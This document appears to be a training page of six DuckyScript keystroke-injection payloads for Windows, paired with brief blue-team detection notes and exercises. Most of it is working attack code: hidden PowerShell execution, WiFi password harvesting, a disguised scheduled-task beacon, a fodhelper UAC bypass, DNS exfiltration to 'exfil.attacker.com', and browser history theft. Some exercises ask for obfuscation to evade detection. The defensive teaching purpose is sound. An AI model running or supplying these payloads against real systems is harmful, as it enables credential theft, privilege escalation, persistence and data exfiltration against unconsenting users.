# Intermediate DuckyScript Payloads

## Overview

These intermediate payloads build on basics with more sophisticated techniques including conditional execution, data gathering, and stealth.

---

## Payload I-01: Silent System Profiler

```
REM ===============================================
REM Payload: Silent System Profiler
REM Level: Intermediate
REM Target: Windows 10/11
REM MITRE: T1082 (System Information Discovery)
REM ===============================================
REM Collects detailed system info without visible windows
REM ===============================================

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "$o=@{};$o.Host=$env:COMPUTERNAME;$o.User=$env:USERNAME;$o.Domain=$env:USERDOMAIN;$o.OS=(Get-CimInstance Win32_OperatingSystem).Caption;$o.IP=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'}).IPAddress;$o.MAC=(Get-NetAdapter | Where-Object Status -eq 'Up').MacAddress;$o.RAM=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB);$o.Disk=(Get-PSDrive C).Used;$o|ConvertTo-Json|Out-File $env:TEMP\.sysinfo.json"
ENTER
```

### Analysis Points
- **Hidden window**: `-w hidden` prevents visual detection
- **Execution policy bypass**: `-ep bypass` runs regardless of policy
- **One-liner**: Entire payload in single command
- **Hidden output**: Uses hidden file (.) prefix

---

## Payload I-02: Credential Harvester

```
REM ===============================================
REM Payload: WiFi Credential Harvester
REM Level: Intermediate
REM Target: Windows 10/11
REM MITRE: T1003 (Credential Dumping)
REM ===============================================
REM Extracts saved WiFi passwords
REM ===============================================

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000

REM Get all WiFi profiles and their passwords
STRING $profiles = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() }
ENTER
STRING $results = @()
ENTER
STRING foreach ($profile in $profiles) {
ENTER
STRING     $pass = (netsh wlan show profile name="$profile" key=clear | Select-String 'Key Content').ToString().Split(':')[1].Trim()
ENTER
STRING     $results += [PSCustomObject]@{SSID=$profile;Password=$pass}
ENTER
STRING }
ENTER
STRING $results | Export-Csv -Path "$env:TEMP\.wifi_creds.csv" -NoTypeInformation
ENTER
STRING exit
ENTER
```

### Defense Detection Points
- Look for `netsh wlan` with `key=clear`
- Monitor access to WiFi profile storage
- Alert on CSV creation in TEMP

---

## Payload I-03: Scheduled Persistence

```
REM ===============================================
REM Payload: Scheduled Task Persistence
REM Level: Intermediate
REM Target: Windows 10/11
REM MITRE: T1053.005 (Scheduled Task)
REM ===============================================
REM Creates persistence via scheduled task
REM ===============================================

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000

REM Create the payload script
STRING $payload = 'Invoke-WebRequest -Uri "http://192.168.1.100:8080/beacon" -Method POST -Body $env:COMPUTERNAME'
ENTER
STRING [System.IO.File]::WriteAllText("$env:APPDATA\update.ps1", $payload)
ENTER

REM Create scheduled task
STRING $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w hidden -ep bypass -f $env:APPDATA\update.ps1"
ENTER
STRING $trigger = New-ScheduledTaskTrigger -AtLogon
ENTER
STRING $settings = New-ScheduledTaskSettingsSet -Hidden
ENTER
STRING Register-ScheduledTask -TaskName "WindowsUpdate" -Action $action -Trigger $trigger -Settings $settings -Force
ENTER
STRING exit
ENTER
```

### Blue Team Detection
```powershell
# Detect suspicious scheduled tasks
Get-ScheduledTask | Where-Object {
    $_.Actions.Execute -like "*powershell*" -and
    ($_.Actions.Arguments -like "*hidden*" -or $_.Actions.Arguments -like "*bypass*")
} | Select-Object TaskName, TaskPath, @{N='Command';E={$_.Actions.Arguments}}
```

---

## Payload I-04: UAC Bypass Runner

```
REM ===============================================
REM Payload: UAC Bypass Launcher
REM Level: Intermediate
REM Target: Windows 10/11
REM MITRE: T1548.002 (UAC Bypass)
REM ===============================================
REM Uses fodhelper bypass to run elevated command
REM ===============================================

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000

REM Set up fodhelper bypass
STRING $command = "powershell -w hidden -ep bypass -c 'whoami > C:\Windows\Temp\elevated.txt'"
ENTER
STRING New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
ENTER
STRING Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value $command
ENTER
STRING New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ""
ENTER

REM Trigger the bypass
STRING Start-Process fodhelper.exe
ENTER
DELAY 2000

REM Clean up
STRING Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
ENTER
STRING exit
ENTER
```

### Blue Team Detection
```yaml
# Sigma rule for fodhelper UAC bypass
title: Fodhelper UAC Bypass
logsource:
    product: windows
    service: sysmon
detection:
    registry_mod:
        EventID: 13
        TargetObject|contains: 'ms-settings\Shell\Open\command'
    process_creation:
        EventID: 1
        Image|endswith: '\fodhelper.exe'
    condition: registry_mod or process_creation
level: high
```

---

## Payload I-05: DNS Exfiltration

```
REM ===============================================
REM Payload: DNS Exfiltration
REM Level: Intermediate
REM Target: Windows 10/11
REM MITRE: T1048.003 (Exfil Over Alternative Protocol)
REM ===============================================
REM Exfiltrates data via DNS queries
REM ===============================================

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000

STRING function Send-DNS {
ENTER
STRING     param([string]$data, [string]$domain)
ENTER
STRING     $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data)) -replace '\+','-' -replace '/','_' -replace '='
ENTER
STRING     $chunks = $encoded -split '(.{60})' | Where-Object { $_ }
ENTER
STRING     foreach ($chunk in $chunks) {
ENTER
STRING         Resolve-DnsName "$chunk.$domain" -ErrorAction SilentlyContinue | Out-Null
ENTER
STRING     }
ENTER
STRING }
ENTER

REM Collect and exfil data
STRING $data = "$env:COMPUTERNAME|$env:USERNAME|$((Get-NetIPAddress -AddressFamily IPv4).IPAddress -join ',')"
ENTER
STRING Send-DNS -data $data -domain "exfil.attacker.com"
ENTER
STRING exit
ENTER
```

### Blue Team Detection
- Monitor for long DNS queries (>50 characters)
- Watch for queries with Base64-like patterns
- Alert on high-frequency queries to single domain

---

## Payload I-06: Browser Data Collector

```
REM ===============================================
REM Payload: Browser Data Collector
REM Level: Intermediate
REM Target: Windows 10/11 (Chrome/Firefox)
REM MITRE: T1005, T1555.003 (Browser Data)
REM ===============================================

DELAY 2000
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000

REM Collect Chrome bookmarks
STRING $chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
ENTER
STRING if (Test-Path "$chrome\Bookmarks") {
ENTER
STRING     Copy-Item "$chrome\Bookmarks" "$env:TEMP\.chrome_bookmarks.json"
ENTER
STRING }
ENTER

REM Collect Chrome history (copy while unlocked)
STRING if (Test-Path "$chrome\History") {
ENTER
STRING     Copy-Item "$chrome\History" "$env:TEMP\.chrome_history.db" -ErrorAction SilentlyContinue
ENTER
STRING }
ENTER

REM Collect Firefox data
STRING $firefox = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*.default*" -ErrorAction SilentlyContinue | Select-Object -First 1
ENTER
STRING if ($firefox) {
ENTER
STRING     Copy-Item "$($firefox.FullName)\places.sqlite" "$env:TEMP\.firefox_history.db" -ErrorAction SilentlyContinue
ENTER
STRING }
ENTER
STRING exit
ENTER
```

---

## Practice Exercises

### Exercise I-01: Modify the System Profiler
Modify Payload I-01 to also collect:
- Installed antivirus products
- Running processes
- Startup programs

### Exercise I-02: Detection Bypass
Create a version of Payload I-02 that:
- Breaks execution into multiple DELAY segments
- Uses string obfuscation
- Cleans up after itself

### Exercise I-03: Alternative Persistence
Implement persistence using:
- Registry Run keys instead of scheduled tasks
- WMI event subscriptions
- Logon scripts

---

## Blue Team Challenges

1. Create a Sigma rule that detects Payload I-05 (DNS exfiltration)
2. Write a PowerShell script to audit for Payload I-03 persistence
3. Develop a network-based detection for Payload I-06 data collection

---

[← Back to Intermediate](../README.md)
